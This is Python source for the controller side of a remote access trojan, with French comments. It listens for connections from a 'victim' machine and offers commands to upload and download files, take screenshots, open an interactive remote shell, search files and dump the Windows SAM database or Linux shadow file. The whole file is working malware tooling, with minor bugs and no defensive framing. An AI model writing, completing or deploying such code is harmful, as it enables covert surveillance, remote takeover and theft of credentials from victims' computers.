import socket 
import sys 
import os
import random
import subprocess
import pyautogui
from PIL import Image



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # AF.Inet pour les IPs , SOCK_TREAM pour une conn TCP 

local_pc = ""
port = 12345

s.bind((local_pc, port)) #associer la socket à une adresse et/ou un numéro de port (locaux)
s.listen()

while True:
    print("Server listening ...")
    conn, addr = s.accept()
    print("Connection OK :", addr)
    print("Tap 'help' for commands")
    
    try:
        
        while True:
          try:
             command= input("Enter command : ").strip('\n') 
             
             if command == 'exit':
             
                conn.send('exit' .encode())
                print('Exiting...')
                conn.close()
                sys.exit(0)
              
             elif command == 'help':
                print("======================================================")
                print("                       Commands                       ")
                print("======================================================")
                print("Commands Available: ")
                print("======================================================")
                
                print('[+] récupération de fichiers du serveur vers la victime : upload ')
                print('[+] récupération de fichiers de la victime vers le serveur: download </path/to/file> <file>')
                print('[+] prendre une capture d écran de la machine victime: screenshot')
                print('[+] ouvrir un shell (bash ou cmd) interactif: shell')
                print('[+] obtenir la configuration réseau de la machine victime: ipconfig/ifconfig')
                print('[+] rechercher un fichier sur la machine victime: find/search')
                print('[+] récupérer la base SAM ou le fichier shadow de la machine: hashdump')
                print('[+] Exit: exit')
                continue
                
                
             elif command == 'upload':
                conn.sendall(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to file on client (with filename and extension): "))
                with open(filepath, 'rb') as file:
                    data= file.read(2147483647)
                    conn.sendall(filename.encode("utf-8"))
                    conn.sendall(data)
                print("File has been uploaded")
                
                continue
                
             elif command[:8] == 'download':
                    conn.send(command.encode("utf-8"))
                    filepath= command.split(" ")[2]
                    file = conn.recv(2147483647)
                    with open(filepath, 'wb') as f:
                        f.write(file)
                        print("File is downloaded")
                    continue
                    
             elif command == 'screenshot':
                        
                conn.send(command.encode())
                file = conn.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file)
                    path1 = os.path.abspath(path)
                    print(f"File is stored at {path1}")
              
                                 
             elif command =='shell' :
             
                while True :
      
                   command = str(input ("rat$ > : "))
                   conn.send(command.encode("utf-8"))
                   if command.lower()== 'exit':
                       break       
                   resultat = conn.recv(1024).decode("utf-8")
                   print(resultat)
                conn.close()
                
             else:
             
               conn.send(command.encode())
               result = conn.recv(4096).decode().strip('\n')
               print(result)
               
 
          except Exception as e :
             print("Error:", str(e))
             print("Disconnected from: ", addr)
          break  
                
    finally:
        conn.close()











